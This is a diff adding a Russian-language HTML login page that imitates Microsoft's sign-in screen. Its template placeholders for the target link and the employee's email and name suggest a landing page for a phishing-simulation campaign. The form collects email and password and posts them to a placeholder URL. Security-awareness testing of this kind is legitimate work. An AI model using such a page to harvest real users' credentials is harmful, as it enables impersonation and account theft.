@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в учетную запись</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .login-card {
+            background: #ffffff;
+            padding: 44px;
+            width: 360px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+            border: 1px solid #e5e5e5;
+            border-radius: 4px;
+        }
+
+        .logo {
+            width: 108px;
+            height: 24px;
+            margin-bottom: 24px;
+            display: flex;
+            gap: 2px;
+        }
+
+        .logo-box {
+            width: 11px;
+            height: 11px;
+        }
+
+        .logo-red {
+            background-color: #f25022;
+        }
+
+        .logo-green {
+            background-color: #7fba00;
+        }
+
+        .logo-blue {
+            background-color: #00a4ef;
+        }
+
+        .logo-yellow {
+            background-color: #ffb900;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin: 0 0 16px 0;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 8px 12px;
+            font-size: 15px;
+            border: 1px solid #666666;
+            border-radius: 2px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #0067b8;
+        }
+
+        .hint {
+            font-size: 13px;
+            color: #505050;
+            margin-bottom: 20px;
+        }
+
+        .btn-group {
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        button {
+            padding: 6px 12px;
+            font-size: 15px;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+        }
+
+        .btn-secondary {
+            background-color: #cccccc;
+            color: #1b1b1b;
+        }
+
+        .btn-primary {
+            background-color: #0067b8;
+            color: #ffffff;
+            min-width: 108px;
+        }
+
+        .btn-primary:hover {
+            background-color: #005da6;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-card">
+        <div class="logo">
+            <div
+                style="display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 24px; height: 24px; margin-right: 8px;">
+                <div class="logo-box logo-red"></div>
+                <div class="logo-box logo-green"></div>
+                <div class="logo-box logo-blue"></div>
+                <div class="logo-box logo-yellow"></div>
+            </div>
+            <span style="font-weight: 600; color: #737373; font-size: 18px; line-height: 24px;">Microsoft</span>
+        </div>
+        <h1>Войти</h1>
+        <form action="{{.Target.Link}}" method="POST">
+            <div class="input-group">
+                <input type="email" name="login" placeholder="Электронная почта, телефон или Skype" required
+                    value="{{.Employee.Email.Address}}">
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Пароль" required>
+            </div>
+            <div class="hint">
+                Учетная запись: <strong>{{.Employee.FirstName}} {{.Employee.LastName}}</strong>
+            </div>
+            <div class="btn-group">
+                <button type="button" class="btn-secondary">Назад</button>
+                <button type="submit" class="btn-primary">Далее</button>
+            </div>
+        </form>
+    </div>
+</body>
+
+</html>
